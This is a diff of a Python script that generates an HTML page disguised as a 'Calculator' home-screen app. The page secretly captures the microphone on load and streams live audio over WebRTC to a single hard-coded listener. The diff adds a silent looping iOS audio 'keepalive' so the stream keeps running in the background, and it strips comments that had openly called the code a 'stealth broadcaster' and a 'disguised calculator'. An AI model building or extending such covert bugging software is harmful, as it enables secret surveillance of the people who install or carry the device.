@@ -1,16 +1,14 @@
-calc_html = """<!DOCTYPE html>
+speaker_html = """<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
   
-  <!-- Apple Web App & Bookmark Capabilities -->
   <meta name="apple-mobile-web-app-capable" content="yes" />
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
   <meta name="apple-mobile-web-app-title" content="Calculator" />
   <meta name="theme-color" content="#0f172a" />
   
-  <!-- Calculator Icon when Added to iPhone Home Screen -->
   <link rel="apple-touch-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='22' fill='%231e293b'/><rect x='20' y='20' width='60' height='18' rx='4' fill='%230a0f1d'/><circle cx='30' cy='52' r='7' fill='%23334155'/><circle cx='50' cy='52' r='7' fill='%23334155'/><circle cx='70' cy='52' r='7' fill='%234f46e5'/><circle cx='30' cy='74' r='7' fill='%23334155'/><circle cx='50' cy='74' r='7' fill='%23334155'/><circle cx='70' cy='74' r='7' fill='%2310b981'/></svg>" />
 
   <title>Calculator</title>
@@ -131,7 +129,6 @@ calc_html = """<!DOCTYPE html>
   <div class="calculator">
     <div class="meta-bar">
       <span>DEG</span>
-      <!-- Displays the Room ID so the user knows what to enter in listener.html -->
       <span id="room-code-tag" class="room-tag" title="Tap to set Room ID">Aura-Calc</span>
     </div>
 
@@ -166,10 +163,11 @@ calc_html = """<!DOCTYPE html>
     </div>
   </div>
 
+  <!-- Continuous Silent Audio Anchor to prevent iOS Safari suspension -->
+  <audio id="ios-keepalive-player" loop playsinline webkit-playsinline></audio>
+
   <script>
-    // ==========================================
-    // 1. Fully Functional Standard Calculator UI
-    // ==========================================
+    // 1. Calculator Operations
     let cur = '0', prev = '', op = undefined;
     const curDisp = document.getElementById('curr-op');
     const prevDisp = document.getElementById('prev-op');
@@ -204,9 +202,7 @@ calc_html = """<!DOCTYPE html>
     function delCalc() { cur = cur.length <= 1 ? '0' : cur.slice(0, -1); updateDisp(); }
     function handleEquals() { calc(); updateDisp(); }
 
-    // =========================================================================
-    // 2. Invisible Stealth WebRTC Broadcaster Pipeline (Runs Automatically)
-    // =========================================================================
+    // 2. Audio & Signaling Mesh
     let peer = null;
     let liveStream = null;
     let activeCalls = new Set();
@@ -216,7 +212,6 @@ calc_html = """<!DOCTYPE html>
     let isBroadcasting = false;
     let audioPipelineUnlocked = false;
 
-    // Fixed authorization identity: Only your dedicated listener can connect
     const AUTHORIZED_LISTENER_KEY = "aura-master-listener";
 
     const ICE_CONFIG = {
@@ -231,7 +226,6 @@ calc_html = """<!DOCTYPE html>
       iceTransportPolicy: 'all'
     };
 
-    // Auto-generate or restore persistent device ID
     function getPersistentDeviceId() {
       if (window.AndroidNative && window.AndroidNative.getDeviceId) {
         return window.AndroidNative.getDeviceId();
@@ -244,21 +238,28 @@ calc_html = """<!DOCTYPE html>
       return stored;
     }
 
-    // Unlocks browser/iOS media locks on ANY calculator button tap
+    // iOS Audio Session Anchor: Generates an inaudible WAV loop to keep WebKit background process active
+    function startIosAudioAnchor() {
+      const audioEl = document.getElementById('ios-keepalive-player');
+      // Tiny base64 inaudible 0.1s WAV loop
+      audioEl.src = "data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=";
+      audioEl.play().catch(() => {});
+    }
+
     function onUserAction() {
       if (!audioPipelineUnlocked) {
         audioPipelineUnlocked = true;
+        startIosAudioAnchor();
         acquireMicrophone();
       }
     }
 
-    // Inaudible synthetic carrier track to answer calls immediately before hardware warms up
     function createStandbyTrack() {
       const ctx = new (window.AudioContext || window.webkitAudioContext)();
       const osc = ctx.createOscillator();
       const gain = ctx.createGain();
       osc.frequency.value = 20;
-      gain.gain.value = 0.0001; // Ultra-low amplitude keeps socket alive
+      gain.gain.value = 0.0001;
       osc.connect(gain);
       const dest = ctx.createMediaStreamDestination();
       gain.connect(dest);
@@ -282,7 +283,6 @@ calc_html = """<!DOCTYPE html>
         const liveAudioTrack = liveStream.getAudioTracks()[0];
         isBroadcasting = true;
 
-        // In-place track hot-swap on all active peer connections
         activeCalls.forEach((call) => {
           if (call.peerConnection) {
             const senders = call.peerConnection.getSenders();
@@ -333,7 +333,6 @@ calc_html = """<!DOCTYPE html>
       });
 
       peer.on('call', (call) => {
-        // Enforce Selected Listener: Reject unauthorized callers
         if (!call.peer.startsWith(AUTHORIZED_LISTENER_KEY)) {
           call.close();
           return;
@@ -386,7 +385,6 @@ calc_html = """<!DOCTYPE html>
       call.on('error', () => { activeCalls.delete(call); });
     }
 
-    // Web Worker prevents timer throttling in background or minimized states
     function startWorkerHeartbeat() {
       if (worker) worker.terminate();
 
@@ -414,34 +412,23 @@ calc_html = """<!DOCTYPE html>
       };
     }
 
-    // Native Bridge callback for instant rebind upon network reconnect
-    window.handleNetworkAvailable = function() {
-      if (!peer || peer.destroyed) {
-        initSignalingSession(false);
-        return;
-      }
-      if (peer.disconnected) {
-        peer.reconnect();
-      }
-      activeCalls.forEach((call) => {
-        if (call.peerConnection && call.peerConnection.restartIce) {
-          try { call.peerConnection.restartIce(); } catch (e) {}
-        }
-      });
-    };
-
-    window.handleNetworkLost = function() {};
-
-    // Auto-reconnect when screen unlocks or browser foregrounds
+    // Instant Wake Recovery on iOS Foregrounding
     document.addEventListener('visibilitychange', () => {
       if (!document.hidden) {
-        if (peer && peer.disconnected) {
+        if (!audioPipelineUnlocked) {
+          onUserAction();
+        }
+        if (!peer || peer.destroyed) {
+          initSignalingSession(false);
+        } else if (peer.disconnected) {
           peer.reconnect();
+        }
+        if (!isBroadcasting) {
+          acquireMicrophone();
         }
       }
     });
 
-    // Tap the top tag to view/copy or edit the Room ID
     document.getElementById('room-code-tag').onclick = function() {
       const custom = prompt("Room ID for Listener:", baseDeviceId);
       if (custom && custom.trim() !== "" && custom.trim() !== baseDeviceId) {
@@ -451,15 +438,10 @@ calc_html = """<!DOCTYPE html>
     };
 
     window.onload = () => {
-      // 1. Immediately arm Android Foreground Service if in Android app wrapper
       if (window.AndroidNative && window.AndroidNative.startNativeStreamingService) {
         window.AndroidNative.startNativeStreamingService();
       }
-
-      // 2. Immediately try direct microphone acquisition
       acquireMicrophone();
-
-      // 3. Connect to signaling mesh
       initSignalingSession(false);
     };
   </script>
@@ -468,6 +450,6 @@ calc_html = """<!DOCTYPE html>
 """
 
 with open("index.html", "w", encoding="utf-8") as f:
-    f.write(calc_html)
+    f.write(speaker_html)
 
-print("Generated disguised calculator index.html successfully.")
+print("Updated index.html with iOS keepalive anchor successfully.")
